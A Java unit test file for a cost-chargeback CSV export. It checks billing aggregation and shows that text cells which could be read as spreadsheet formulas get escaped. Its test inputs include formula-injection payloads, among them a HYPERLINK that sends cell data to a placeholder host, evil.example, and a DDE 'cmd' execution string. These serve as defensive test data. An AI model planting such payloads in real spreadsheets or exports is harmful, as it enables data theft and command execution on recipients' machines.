package com.iaf.console.cost.chargeback.domain;

import static org.assertj.core.api.Assertions.assertThat;

import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.time.LocalDate;
import java.util.HexFormat;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.junit.jupiter.api.Test;

import com.iaf.console.cost.ledger.domain.Bucket;
import com.iaf.console.cost.ledger.domain.BucketDay;
import com.iaf.console.cost.pricing.domain.Micros;

/** A month's lines, its rows split by a tag, and the CSV finance receives, whose text cells never open as formulas. */
class ChargebacksTest {

    private static final String ACCOUNT = "123456789012";

    @Test
    void linesSumBucketsBySeviceAndTagSetAndRowsSplitByAnyTag() {
        Bucket web = Bucket.of(ACCOUNT, "global", "compute", "vm", Map.of("team", "web"));
        Bucket data = Bucket.of(ACCOUNT, "global", "compute", "vm", Map.of("team", "data"));
        Bucket db = Bucket.of(ACCOUNT, "global", "database", "database", Map.of());
        List<BucketDay> days = List.of(day(web, 1, 10.0), day(web, 2, 10.0), day(data, 1, 5.0), day(db, 1, 2.5));
        List<ChargebackMonth.Line> lines = Chargebacks.lines(days);
        assertThat(lines).hasSize(3);
        ChargebackMonth m = new ChargebackMonth(ACCOUNT, "2026-10", "Payments, \"prod\"", "=CC-1", "USD", lines, Micros.of(27.5), null, null, null);

        assertThat(Chargebacks.rows(m, null)).extracting(ChargebackRow::service, ChargebackRow::amount)
                .containsExactly(org.assertj.core.groups.Tuple.tuple("compute", 25.0), org.assertj.core.groups.Tuple.tuple("database", 2.5));
        assertThat(Chargebacks.rows(m, "team")).extracting(r -> r.service() + "/" + r.tag().value())
                .containsExactly("compute/data", "compute/web", "database/");

        String csv = Chargebacks.csv("2026-10", "USD", true, Chargebacks.rows(m, null));
        assertThat(csv).startsWith(Chargebacks.HEADER + "\r\n")
                .contains("2026-10,\"'=CC-1\",123456789012,\"Payments, \"\"prod\"\"\",compute,,,25.00,USD,true\r\n");
        assertThat(Chargebacks.sha256(csv)).isEqualTo(Chargebacks.sha256(Chargebacks.csv("2026-10", "USD", true, Chargebacks.rows(m, null))))
                .hasSize(64);
    }

    @Test
    void aTextCellASpreadsheetCouldTakeForAFormulaOpensAsText() {
        // a leading = + - or @, after any leading whitespace, or a leading tab or carriage return:
        // an apostrophe first, and quoted, so the apostrophe is inside the quotes
        Map<String, String> escaped = new LinkedHashMap<>();
        escaped.put("=CC-1", "\"'=CC-1\"");
        escaped.put("+1+1", "\"'+1+1\"");
        escaped.put("-2+3", "\"'-2+3\"");
        escaped.put("-", "\"'-\"");
        escaped.put("@SUM(A1:A2)", "\"'@SUM(A1:A2)\"");
        escaped.put("=HYPERLINK(\"https://evil.example/?d=\"&A1,\"open\")", "\"'=HYPERLINK(\"\"https://evil.example/?d=\"\"&A1,\"\"open\"\")\"");
        escaped.put("=cmd|' /C calc'!A0", "\"'=cmd|' /C calc'!A0\"");
        escaped.put(" =1+1", "\"' =1+1\"");
        escaped.put("   @x", "\"'   @x\"");
        escaped.put("\u00a0=1+1", "\"'\u00a0=1+1\"");
        escaped.put("\u3000+1", "\"'\u3000+1\"");
        escaped.put("\n=1+1", "\"'\n=1+1\"");
        escaped.put("\t=1+1", "\"'\t=1+1\"");
        escaped.put("\tplain", "\"'\tplain\"");
        escaped.put("\rplain", "\"'\rplain\"");
        escaped.forEach((value, cell) -> assertThat(Chargebacks.cell(value)).as("%s", value).isEqualTo(cell));

        // anything else as RFC 4180 has it: plain, or quoted for a comma, a quote or a line break
        assertThat(Chargebacks.cell("Payments production")).isEqualTo("Payments production");
        assertThat(Chargebacks.cell("CC-1042")).isEqualTo("CC-1042");
        assertThat(Chargebacks.cell("a=b")).isEqualTo("a=b");
        assertThat(Chargebacks.cell("team@example.com")).isEqualTo("team@example.com");
        assertThat(Chargebacks.cell("'quoted already")).isEqualTo("'quoted already");
        assertThat(Chargebacks.cell("Payments, \"prod\"")).isEqualTo("\"Payments, \"\"prod\"\"\"");
        assertThat(Chargebacks.cell("two\nlines")).isEqualTo("\"two\nlines\"");
        assertThat(Chargebacks.cell("   ")).isEqualTo("   ");
        assertThat(Chargebacks.cell("")).isEmpty();
        assertThat(Chargebacks.cell(null)).isEmpty();
    }

    @Test
    void theCsvEscapesItsTextCellsAndLeavesAmountsNumbersACreditNegative() throws Exception {
        Bucket web = Bucket.of(ACCOUNT, "global", "compute", "vm", Map.of("team", "=cmd|' /C calc'!A0"));
        Bucket credit = Bucket.of(ACCOUNT, "global", "database", "database", Map.of("team", "-credits"));
        List<ChargebackMonth.Line> lines = Chargebacks.lines(List.of(day(web, 1, 10.0), day(credit, 1, -12.5)));
        ChargebackMonth m = new ChargebackMonth(ACCOUNT, "2026-10", "@Payments", "+CC-1", "USD", lines, Micros.of(-2.5), null, null, null);

        String csv = Chargebacks.csv("2026-10", "USD", false, Chargebacks.rows(m, "team"));
        assertThat(csv.split("\r\n")).containsExactly(Chargebacks.HEADER,
                "2026-10,\"'+CC-1\",123456789012,\"'@Payments\",compute,team,\"'=cmd|' /C calc'!A0\",10.00,USD,false",
                "2026-10,\"'+CC-1\",123456789012,\"'@Payments\",database,team,\"'-credits\",-12.50,USD,false");
        // the sha256 is over the very bytes served: the CSV as UTF-8
        assertThat(Chargebacks.sha256(csv))
                .isEqualTo(HexFormat.of().formatHex(MessageDigest.getInstance("SHA-256").digest(csv.getBytes(StandardCharsets.UTF_8))));
    }

    private static BucketDay day(Bucket b, int dayOfMonth, double amount) {
        return new BucketDay(ACCOUNT, LocalDate.of(2026, 10, dayOfMonth), b, 0, 0, Micros.of(amount), 1, 0);
    }
}
